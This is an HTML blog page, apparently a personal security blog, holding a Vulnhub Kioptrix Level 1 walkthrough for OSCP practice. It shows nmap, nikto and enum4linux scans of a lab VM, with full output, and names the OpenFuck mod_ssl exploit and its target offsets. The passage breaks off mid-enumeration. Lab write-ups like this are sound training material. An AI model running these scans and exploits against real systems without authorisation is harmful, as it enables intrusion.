@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="Let us discuss your security">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="One Plus &lt;weirdless.info@gmail.com&gt;">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Vulnhub - OSCP Series - Kioptrix Level 1"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="Let us discuss your security" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="One Plus - X"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>Vulnhub - OSCP Series - Kioptrix Level 1 - One Plus - X</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-81899858-1"></script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-81899858-1', 'auto');
+  ga('send', 'pageview');
+		
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-81899858-1');
+</script>
+
+    <!-- Google Adsense -->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-2313105504330449",
+    enable_page_level_ads: true
+  });
+</script>
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/cheatsheet">
+                    Cheatsheets
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    Contact
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/cheatsheet">
+                    Gallery
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/catch">
+                    Catch ME
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/OSINTToolkit">
+                    OSINTToolkit
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-code" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/02/25/kioptrix-1/">
+                Vulnhub - OSCP Series - Kioptrix Level 1
+            </a>
+        </h1>
+        <div class="post-info">
+
+
+            
+                <span class="author">Author: <a href="https://twitter.com/One_PlusX" target="_blank">Tanoy Bose</a></span> <br>
+            
+
+
+            
+                <span class="date">2017-02-25</span>
+            
+            <a href="#disqus_thread" class="comments">Comments</a>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Part of the OSCP preparation VMs from vulnhub, Kioptrix is a boot to root challenge series. While travelling 6 hours in an intercity bus, without any access to internet, I took upon myself to attempt solving as many Kioptrix levels as possible. Turns out it was super hard with the enormous number of errors I faced during compilation of any of the exploits that I wanted.</p>
+<a id="more"></a>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>The setup is a VMWare setup. I imported this on my VMWare workstation and kept the network adapter to be in Host-Only mode. Now on my host Kali OS, I checked out the IP information that I got<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ ifconfig</div><div class="line">... snip ...</div><div class="line">vmnet1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</div><div class="line">        inet 192.168.136.1  netmask 255.255.255.0  broadcast 192.168.136.255</div><div class="line">... snip ...</div></pre></td></tr></table></figure></p>
+<p>Good. So we go ahead and ping scan 192.168.136.0/24<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ nmap -n -sn -vvv 192.168.136.0-255</div></pre></td></tr></table></figure></p>
+<p>We see that Host 192.168.136.128 is up. Hence we go ahead and scan it completely.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ nmap -vvv -A -oA 192.168.136.128 192.168.136.128</div><div class="line">Nmap scan report <span class="keyword">for</span> 192.168.136.128</div><div class="line">Host is up, received arp-response (0.00025s latency).</div><div class="line">Scanned at 2017-02-03 14:08:17 IST <span class="keyword">for</span> 106s</div><div class="line">Not shown: 994 closed ports</div><div class="line">Reason: 994 resets</div><div class="line">PORT     STATE SERVICE     REASON         VERSION</div><div class="line">22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)</div><div class="line">| ssh-hostkey: </div><div class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</div><div class="line">| 1024 35 109482092953601530927446985143812377560925655194254170270380314520841776849335628258408994190413716152105684423280369467219093526740118507720167655934779634416983599247086840099503203800281526143567271862466057363705861760702664279290804439502645034586412570490614431533437479630834594344497670338190191879537</div><div class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</div><div class="line">| ssh-dss AAAAB3NzaC1kc3MAAACBAKtycvxuV/e7s2cN74HyTZXHXiBrwyiZe/PKT/inuT5NDSQTPsGiyJZU4gefPAsYKSw5wLe28TDlZWHAdXpNdwyn4QrFQBjwFR+8WbFiAZBoWlSfQPR2RQW8i32Y2P2V79p4mu742HtWBz0hTjkd9qL5j8KCUPDfY9hzDuViWy7PAAAAFQCY9bvq+5rs1OpY5/DGsGx0k6CqGwAAAIBVpBtIHbhvoQdN0WPe8d6OzTTFvdNRa8pWKzV1Hpw+e3qsC4LYHAy1NoeaqK8uJP9203MEkxrd2OoBJKn/8EXlKAco7vC1dr/QWae+NEkI1a38x0Ml545vHAGFaVUWkffHekjhR476Uq4N4qeLfFp5B+v+9flLxYVYsY/ymJKpNgAAAIEApyjrqjgX0AE4fSBFntGFWM3j5M3lc5jw/0qufXlHJu8sZG0FRf9wTI6HlJHHsIKHA7FZ33vGLq3TRmvZucJZ0l55fV2ASS9uvQRE+c8P6w72YCzgJN7v4hYXxnY4RiWvINjW/F6ApQEUJc742i6Fn54FEYAIy5goatGFMwpVq3Q=</div><div class="line">|   1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</div><div class="line">|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAvv8UUWsrO7+VCG/rTWY72jElft4WXfXGWybh141E8XnWxMCu+R1qdocxhh+4Clz8wO9beuZzG1rjlAD+XHiR3j2P+sw6UODeyBkuP24a+7V8P5nu9ksKD1fA83RyelgSgRJNQgPfFU3gngNno1yN6ossqkcMQTI1CY5nF6iYePs=</div><div class="line">|_sshv1: Server supports SSHv1</div><div class="line">80/tcp   open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</div><div class="line">| http-methods: </div><div class="line">|   Supported Methods: GET HEAD OPTIONS TRACE</div><div class="line">|_  Potentially risky methods: TRACE</div><div class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</div><div class="line">|_http-title: Test Page <span class="keyword">for</span> the Apache Web Server on Red Hat Linux</div><div class="line">111/tcp  open  rpcbind     syn-ack ttl 64 2 (RPC <span class="comment">#100000)</span></div><div class="line">| rpcinfo: </div><div class="line">|   program version   port/proto  service</div><div class="line">|   100000  2            111/tcp  rpcbind</div><div class="line">|   100000  2            111/udp  rpcbind</div><div class="line">|   100024  1           1024/tcp  status</div><div class="line">|_  100024  1           1024/udp  status</div><div class="line">139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)</div><div class="line">443/tcp  open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</div><div class="line">| http-methods: </div><div class="line">|_  Supported Methods: GET HEAD POST</div><div class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</div><div class="line">|_http-title: 400 Bad Request</div><div class="line">|_ssl-date: 2017-02-03T09:40:28+00:00; +1h01m55s from scanner time.</div><div class="line">| sslv2: </div><div class="line">|   SSLv2 supported</div><div class="line">|   ciphers: </div><div class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</div><div class="line">|     SSL2_DES_64_CBC_WITH_MD5</div><div class="line">|     SSL2_RC4_128_WITH_MD5</div><div class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</div><div class="line">|     SSL2_RC4_64_WITH_MD5</div><div class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</div><div class="line">|_    SSL2_RC2_128_CBC_WITH_MD5</div><div class="line">1024/tcp open  status      syn-ack ttl 64 1 (RPC <span class="comment">#100024)</span></div><div class="line">MAC Address: 00:0C:29:EC:EE:1A (VMware)</div><div class="line">Device <span class="built_in">type</span>: general purpose</div><div class="line">Running: Linux 2.4.X</div><div class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</div><div class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</div><div class="line">TCP/IP fingerprint:</div><div class="line">OS:SCAN(V=7.40%E=4%D=2/3%OT=22%CT=1%CU=38097%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM</div><div class="line">OS:=589441E3%P=x86_64-pc-linux-gnu)SEQ(SP=CB%GCD=1%ISR=D1%TI=Z%CI=Z%II=I%TS</div><div class="line">OS:=7)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11NW0%O5=M</div><div class="line">OS:5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16</div><div class="line">OS:A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=</div><div class="line">OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11N</div><div class="line">OS:W0%RD=0%Q=)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FF%</div><div class="line">OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=</div><div class="line">OS:)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164%</div><div class="line">OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)</div><div class="line"></div><div class="line">Uptime guess: 0.005 days (since Fri Feb  3 14:03:02 2017)</div><div class="line">Network Distance: 1 hop</div><div class="line">TCP Sequence Prediction: Difficulty=203 (Good luck!)</div><div class="line">IP ID Sequence Generation: All zeros</div><div class="line"></div><div class="line">Host script results:</div><div class="line">|_clock-skew: mean: 1h01m54s, deviation: 0s, median: 1h01m54s</div><div class="line">| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div><div class="line">| Names:</div><div class="line">|   KIOPTRIX&lt;00&gt;         Flags: &lt;unique&gt;&lt;active&gt;</div><div class="line">|   KIOPTRIX&lt;03&gt;         Flags: &lt;unique&gt;&lt;active&gt;</div><div class="line">|   KIOPTRIX&lt;20&gt;         Flags: &lt;unique&gt;&lt;active&gt;</div><div class="line">|   MYGROUP&lt;00&gt;          Flags: &lt;group&gt;&lt;active&gt;</div><div class="line">|   MYGROUP&lt;1e&gt;          Flags: &lt;group&gt;&lt;active&gt;</div><div class="line">| Statistics:</div><div class="line">|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">| p2p-conficker: </div><div class="line">|   Checking <span class="keyword">for</span> Conficker.C or higher...</div><div class="line">|   Check 1 (port 48078/tcp): CLEAN (Couldn<span class="string">'t connect)</span></div><div class="line">|   Check 2 (port 26125/tcp): CLEAN (Couldn't connect)</div><div class="line">|   Check 3 (port 12014/udp): CLEAN (Timeout)</div><div class="line">|   Check 4 (port 56019/udp): CLEAN (Failed to receive data)</div><div class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</div><div class="line"></div><div class="line">TRACEROUTE</div><div class="line">HOP RTT     ADDRESS</div><div class="line">1   0.25 ms 192.168.136.128</div><div class="line"></div><div class="line">Read data files from: /usr/bin/../share/nmap</div><div class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div class="line"><span class="comment"># Nmap done at Fri Feb  3 14:10:03 2017 -- 1 IP address (1 host up) scanned in 106.41 seconds</span></div><div class="line">root@root:/home/oneplus/learning/OSCP/Kioptrix1<span class="comment">#</span></div></pre></td></tr></table></figure>
+<p>Post this, I did enumeration of all ports that were open. Of these, the two interesting ones would be https and smb. Here is the output for<br>Here I was able to identify two vulnerabilities</p>
+<h2 id="Exploit-1-mod-ssl-and-OpenFuck"><a href="#Exploit-1-mod-ssl-and-OpenFuck" class="headerlink" title="Exploit 1 - mod_ssl and OpenFuck"></a>Exploit 1 - mod_ssl and OpenFuck</h2><p>Running nikto on the server on port 443 gives us something interesting<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ nikto -host 192.168.136.128 -port 443</div><div class="line">- Nikto v2.1.6</div><div class="line">---------------------------------------------------------------------------</div><div class="line">+ Target IP:          192.168.136.128</div><div class="line">+ Target Hostname:    192.168.136.128</div><div class="line">+ Target Port:        443</div><div class="line">---------------------------------------------------------------------------</div><div class="line">+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</div><div class="line">+ The anti-clickjacking X-Frame-Options header is not present.</div><div class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></div><div class="line">+ No CGI Directories found (use <span class="string">'-C all'</span> to force check all possible <span class="built_in">dirs</span>)</div><div class="line">+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header</div><div class="line">+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</div><div class="line">+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</div><div class="line">+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.</div><div class="line">+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</div><div class="line">+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a <span class="built_in">local</span> buffer overflow <span class="built_in">which</span> allows attackers to <span class="built_in">kill</span> any process on the system. CAN-2002-0839.</div><div class="line">+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows <span class="keyword">in</span> mod_rewrite and mod_cgi. CAN-2003-0542.</div><div class="line">+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow <span class="built_in">which</span> may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</div><div class="line">+ ///etc/hosts: The server install allows reading of any system file by adding an extra <span class="string">'/'</span> to the URL.</div><div class="line">+ 7550 requests: 14 error(s) and 12 item(s) reported on remote host</div><div class="line">+ End Time:           2017-02-27 14:32:31 (GMT5.5) (11 seconds)</div><div class="line">---------------------------------------------------------------------------</div><div class="line">+ 1 host(s) tested</div></pre></td></tr></table></figure></p>
+<p>Ahh, possible remote code execution. Upon searching in out local exploitdb instance, we find OpenFuck.C.<br>I tried compiling the OpenFuck.c exploit, however it failed because of SSL requirements. And since I was travelling, I had to do the hack with whatever was available to me at that point of time.<br>After reaching back however, I ran a new instance of ubuntu system on my virtual box environment, downgraded the environment and ran the exploit sucessfully.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</div><div class="line">0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</div></pre></td></tr></table></figure></p>
+<h2 id="Exploit-2-SAMBA-server"><a href="#Exploit-2-SAMBA-server" class="headerlink" title="Exploit 2 - SAMBA server"></a>Exploit 2 - SAMBA server</h2><p>Hunting for more vulnerabilities, I faced port 139. On running enum4linux, I got the following output<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> ========================== </div><div class="line">|    Target Information    |</div><div class="line"> ========================== </div><div class="line">Target ........... 192.168.136.128</div><div class="line">RID Range ........ 500-550,1000-1050</div><div class="line">Username ......... <span class="string">''</span></div><div class="line">Password ......... <span class="string">''</span></div><div class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</div><div class="line"></div><div class="line"></div><div class="line"> ======================================================= </div><div class="line">|    Enumerating Workgroup/Domain on 192.168.136.128    |</div><div class="line"> ======================================================= </div><div class="line">[+] Got domain/workgroup name: MYGROUP</div><div class="line"></div><div class="line"> =============================================== </div><div class="line">|    Nbtstat Information <span class="keyword">for</span> 192.168.136.128    |</div><div class="line"> =============================================== </div><div class="line">Looking up status of 192.168.136.128</div><div class="line">	KIOPTRIX        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</div><div class="line">	KIOPTRIX        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</div><div class="line">	KIOPTRIX        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</div><div class="line">	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</div><div class="line">	MYGROUP         &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</div><div class="line">	MYGROUP         &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</div><div class="line">	MYGROUP         &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</div><div class="line"></div><div class="line">	MAC Address = 00-00-00-00-00-00</div><div class="line"></div><div class="line"> ======================================== </div><div class="line">|    Session Check on 192.168.136.128    |</div><div class="line"> ======================================== </div><div class="line">[+] Server 192.168.136.128 allows sessions using username <span class="string">''</span>, password <span class="string">''</span></div><div class="line"></div><div class="line"> ============================================== </div><div class="line">|    Getting domain SID <span class="keyword">for</span> 192.168.136.128    |</div><div class="line"> ============================================== </div><div class="line">Domain Name: MYGROUP</div><div class="line">Domain Sid: (NULL SID)</div><div class="line">[+] Can<span class="string">'t determine if host is part of domain or part of a workgroup</span></div><div class="line"></div><div class="line"> ========================================= </div><div class="line">|    OS information on 192.168.136.128    |</div><div class="line"> ========================================= </div><div class="line">[+] Got OS info for 192.168.136.128 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</div><div class="line">[+] Got OS info for 192.168.136.128 from srvinfo:</div><div class="line">	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server</div><div class="line">	platform_id     :	500</div><div class="line">	os version      :	4.5</div><div class="line">	server type     :	0x9a03</div><div class="line"></div><div class="line"> ================================ </div><div class="line">|    Users on 192.168.136.128    |</div><div class="line"> ================================ </div><div class="line"></div><div class="line"></div><div class="line"> ============================================ </div><div class="line">|    Share Enumeration on 192.168.136.128    |</div><div class="line"> ============================================ </div><div class="line">WARNING: The "syslog" option is deprecated</div><div class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 